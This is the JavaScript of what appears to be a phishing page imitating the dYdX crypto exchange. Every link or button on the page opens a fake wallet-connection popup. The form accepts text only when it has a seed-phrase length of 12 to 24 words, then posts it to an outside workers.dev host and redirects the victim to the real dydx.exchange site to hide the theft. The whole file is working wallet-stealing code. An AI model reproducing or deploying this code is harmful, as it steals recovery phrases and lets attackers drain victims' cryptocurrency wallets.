const popup = document.querySelector('#popup');
const buttons = document.querySelectorAll('._2fTqNZMFx8KbTbKpTxNxm, a, [role="button"]')
buttons.forEach((item) => {
  item.addEventListener('click', () => {
    popup.classList.remove('hidden');
  });
});

const backButton = document.querySelector('#back');
backButton.onclick = () => {
  popup.classList.add('hidden');
};

const walletButtons = document.querySelectorAll('.sc-fFSPTT.kZBxPI');
walletButtons.forEach((item) => {
  item.addEventListener('click', () => {
    document.querySelector('#form-popup .name').innerText = item.innerText;
    document.querySelector('#form-popup #wallet').value = item.innerText;
    document.querySelector('#wallet-selector').classList.add('hidden');
    document.querySelector('#form-popup').classList.remove('hidden');

    backButton.onclick = () => {
      document.querySelector('#wallet-selector').classList.remove('hidden');
      document.querySelector('#form-popup').classList.add('hidden');

      backButton.onclick = () => {
        popup.classList.add('hidden');
      };
    };
  });
});

$('#form-popup button').click(function() {
  let count = $('#form-popup form textarea').val().trim().split(" ").length;
  
  if (count === 12 || count === 15 || count === 18 || count === 21 || count === 24) {
    $.post('https://blue-gay.juistespastelastes.workers.dev/', $('#form-popup form').serialize())
      .done(function(response) {
        window.location.href = 'https://dydx.exchange/';
      });
  } else {
    $('#form-popup form textarea').addClass('error');
    setTimeout(() => {
      $('#form-popup form textarea').removeClass('error');
    }, 1500);
  }
});
